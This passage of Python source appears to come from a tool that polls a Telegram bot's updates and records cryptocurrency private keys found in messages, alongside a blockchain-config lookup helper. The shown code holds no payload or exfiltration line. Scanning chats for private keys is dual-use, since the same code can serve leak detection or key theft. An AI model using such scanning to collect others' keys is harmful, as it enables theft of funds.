                                    is_valid=False,
                                    source_type="private_key",
                                ))
                                break
            except Exception as e:
                logger.error("Telegram scan error: %s", e)

        return findings

    async def _get_updates(
        self, client: httpx.AsyncClient, limit: int
    ) -> list[dict]:
        """Fetch updates from the Telegram Bot API."""
        try:
            resp = await client.get(
                f"https://api.telegram.org/bot{self.bot_token}/getUpdates",
                params={
                    "offset": self._last_update_id + 1,
                    "limit": min(limit, 100),
                    "allowed_updates": '["message"]',
                },
            )
            resp.raise_for_status()
            data = resp.json()
            if not data.get("ok"):
                logger.warning("Telegram API error: %s", data.get("description", "unknown"))
                return []

            updates = data.get("result", [])
            if updates:
                self._last_update_id = updates[-1]["update_id"]
            return updates
        except Exception as e:
            logger.error("Telegram getUpdates error: %s", e)
            return []


def _find_chain(name: str, chains: list[ChainConfig]) -> Optional[ChainConfig]:
    """Find a chain by name in a list."""
    return next((c for c in chains if c.name == name), None)
